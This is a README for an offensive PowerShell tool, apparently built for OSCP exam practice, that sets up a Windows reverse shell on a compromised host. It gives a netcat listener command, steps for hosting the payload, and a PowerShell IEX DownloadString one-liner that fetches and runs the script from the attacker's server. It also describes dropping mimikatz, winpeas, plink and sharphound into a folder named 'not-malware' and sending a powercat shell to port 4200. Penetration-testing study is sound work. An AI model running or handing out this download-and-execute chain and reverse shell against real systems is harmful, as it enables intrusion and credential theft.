# powershell-infect
A powershell script for the OSCP Exam which sets up a windows reverse shell and automates the download of some useful windows post-exploit and privilege escalation tools.


## Usage

1. Change the paths in the script to reflect the locations of the binaries on your attack box
2. setup a netcat listener at port 4200 (or change the port in the script as well as the following command)
```
rlwrap nc -lvnp 4200
```
3. Host the script on a web server. Perhaps using
```
systemctl start apache2
```
and moving the infect.ps1 file to `/var/www/html` if you are on a modern kali system
4. Upon discovery of RCE in a windows system, execute the following command, replacing your attack box's ip with <RHOST>, and the path of the script on your locally hosted web server
```
powershell -c 'IEX (New-Object System.Net.WebClient).DownloadString('http://<RHOST></some/path/infect.ps1>; infect <RHOST>
```


## Features
This script performs the following actions
1. checks architecture to determine which binaries to download
2. downloads powercat to memory
3. downloads the following to disk in a directory called `.\not-malware` (full path determined by the location of the RCE):
    - winpeas
    - mimikatz
    - plink
    - sharphound
4. sends a powercat reverse shell to a local listener at port 4200
